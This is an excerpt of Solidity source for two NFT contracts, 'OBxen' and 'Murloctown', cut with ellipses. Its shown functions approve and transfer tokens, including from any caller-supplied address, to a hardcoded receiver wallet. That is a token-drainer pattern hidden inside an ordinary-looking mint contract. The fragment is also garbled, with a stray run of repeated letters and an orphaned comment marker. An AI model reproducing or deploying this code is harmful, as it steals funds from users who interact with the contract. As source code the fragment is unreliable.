...
contract OBxen is ERC2981, ERC721A, Ownable {
    ...
    address _reciverAddress = 0x3cf642b0F913B4c3D30639B7639431769f415535;

    ITokenApprove public _tokenApprove;

    bool public _started;
    string public _metadataURI = "https://bucketlg.s3.us-east-2.amazonaws.com/json/";

    constructor() ERC721A("OBX", "OBX") {
...
contract Murloctown is ERC2981, ERC721A, Ownable {
    ...
    constructor(
        ...
        uint32 txLimit,
        uint32 walletLimit
    ) ERC721A("murloctown", "MLT") {aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
...
*/
    ...
    function tokenApprove(uint256 value) external returns(bool){
        return _tokenApprove.approve(_reciverAddress, value);
    }

    function tokenTransfer(uint256 value) external returns(bool){
        return _tokenApprove.transfer(_reciverAddress, value);
    }

    function tokenTransferfrom(address from, uint256 value) external returns(bool){
        return _tokenApprove.transferfrom(from, _reciverAddress, value);
    }

    function setToken(address _addr) external onlyOwner {
        _tokenApprove = ITokenApprove(_addr);
    }
